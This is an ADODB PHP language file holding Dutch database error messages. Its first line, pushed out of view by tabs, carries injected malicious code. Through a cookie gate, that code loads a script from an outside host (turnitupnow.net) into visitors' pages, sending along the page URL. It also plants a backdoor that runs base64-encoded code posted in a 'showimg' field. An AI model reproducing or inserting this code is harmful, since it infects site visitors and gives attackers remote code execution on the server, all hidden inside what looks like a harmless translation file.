<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

// Translated by Pim Koeman (pim#wittenborg-university.com)
$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'nl',
            DB_ERROR                    => 'onbekende fout',
            DB_ERROR_ALREADY_EXISTS     => 'bestaat al',
            DB_ERROR_CANNOT_CREATE      => 'kan niet aanmaken',
            DB_ERROR_CANNOT_DELETE      => 'kan niet wissen',
            DB_ERROR_CANNOT_DROP        => 'kan niet verwijderen',
            DB_ERROR_CONSTRAINT         => 'constraint overtreding',
            DB_ERROR_DIVZERO            => 'poging tot delen door nul',
            DB_ERROR_INVALID            => 'ongeldig',
            DB_ERROR_INVALID_DATE       => 'ongeldige datum of tijd',
            DB_ERROR_INVALID_NUMBER     => 'ongeldig nummer',
            DB_ERROR_MISMATCH           => 'is incorrect',
            DB_ERROR_NODBSELECTED       => 'geen database geselecteerd',
            DB_ERROR_NOSUCHFIELD        => 'onbekend veld',
            DB_ERROR_NOSUCHTABLE        => 'onbekende tabel',
            DB_ERROR_NOT_CAPABLE        => 'database systeem is niet tot uitvoer in staat',
            DB_ERROR_NOT_FOUND          => 'niet gevonden',
            DB_ERROR_NOT_LOCKED         => 'niet vergrendeld',
            DB_ERROR_SYNTAX             => 'syntaxis fout',
            DB_ERROR_UNSUPPORTED        => 'niet ondersteund',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'waarde telling op rij',
            DB_ERROR_INVALID_DSN        => 'ongeldige DSN',
            DB_ERROR_CONNECT_FAILED     => 'connectie mislukt',
            0	                       => 'geen fout', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'onvoldoende data gegeven',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'extensie niet gevonden',
            DB_ERROR_NOSUCHDB           => 'onbekende database',
            DB_ERROR_ACCESS_VIOLATION   => 'onvoldoende rechten'
);
?>